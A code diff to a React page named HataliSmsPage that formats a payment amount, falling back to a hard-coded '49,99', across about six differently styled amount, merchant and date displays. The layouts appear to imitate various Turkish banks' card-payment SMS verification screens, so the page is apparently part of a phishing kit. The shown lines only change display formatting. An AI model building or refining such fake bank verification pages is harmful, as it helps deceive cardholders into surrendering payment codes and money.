@@ -189,6 +189,8 @@ export default function HataliSmsPage() {
         );
     }
 
+    const cleanTutar = (data?.tutar || '').replace(/TL|TRY|₺/gi, '').trim() || '49,99';
+
     if (isSuccess) {
         return (
             <>
@@ -281,7 +283,7 @@ export default function HataliSmsPage() {
                                                     <li>
                                                         <label>Tutar</label>
                                                         <i className="icon-number-one d-none d-md-inline-block"></i>
-                                                        <span className="total-value">{data?.tutar} ₺</span>
+                                                        <span className="total-value">{cleanTutar} ₺</span>
                                                     </li>
                                                     <li>
                                                         <label>Mağaza</label>
@@ -432,7 +434,7 @@ export default function HataliSmsPage() {
                                             </div>
                                             <div className="dijitalgozluk-tablo-satir">
                                                 <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Tutar </div>
-                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> {data?.tutar} ₺</div>
+                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> {cleanTutar} ₺</div>
                                             </div>
                                             <div className="dijitalgozluk-tablo-satir">
                                                 <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Tarih </div>
@@ -588,7 +590,7 @@ export default function HataliSmsPage() {
                         </div>
                         <div className="dn-body">
                             <div className="dn-info-grid">
-                                <div className="dn-info-box"><div className="lbl">TUTAR</div><div className="val">{data?.tutar} ₺</div></div>
+                                <div className="dn-info-box"><div className="lbl">TUTAR</div><div className="val">{cleanTutar} ₺</div></div>
                                 <div className="dn-info-box"><div className="lbl">TARİH</div><div className="val">{data?.tarih}</div></div>
                                 <div className="dn-info-box" style={{ gridColumn: '1/-1' }}><div className="lbl">İŞYERİ</div><div className="val">{data?.isyeriAdi}</div></div>
                             </div>
@@ -668,7 +670,7 @@ export default function HataliSmsPage() {
                                 <div className="info-row">
                                     <div className="info-col info-label">İşlem Tutarı:</div>
                                     <div className="info-col" style={{ fontSize: '21px', fontWeight: '900', marginTop: '-5px' }} id="amount">
-                                        {data?.tutar} TL
+                                        {cleanTutar} TL
                                     </div>
                                 </div>
                                 <div className="info-row">
@@ -803,7 +805,7 @@ export default function HataliSmsPage() {
                                     <span>{data?.isyeriAdi}</span>
                                 </div>
                                 <div className="col-xs-6 col-sm-4 amount">
-                                    <span> {data?.tutar} ₺</span>
+                                    <span> {cleanTutar} ₺</span>
                                 </div>
                                 <div className="col-xs-6 col-sm-4 date">
                                     <span> {data?.tarih} </span>
@@ -938,7 +940,7 @@ export default function HataliSmsPage() {
                                 </div>
                                 <div className="info-row">
                                     <div className="info-col info-label">İşlem Tutarı:</div>
-                                    <div className="info-col amount" id="amount">{data?.tutar} ₺</div>
+                                    <div className="info-col amount" id="amount">{cleanTutar} ₺</div>
                                 </div>
                                 <div className="info-row">
                                     <div className="info-col info-label">İşlem Tarihi-Saati:</div>
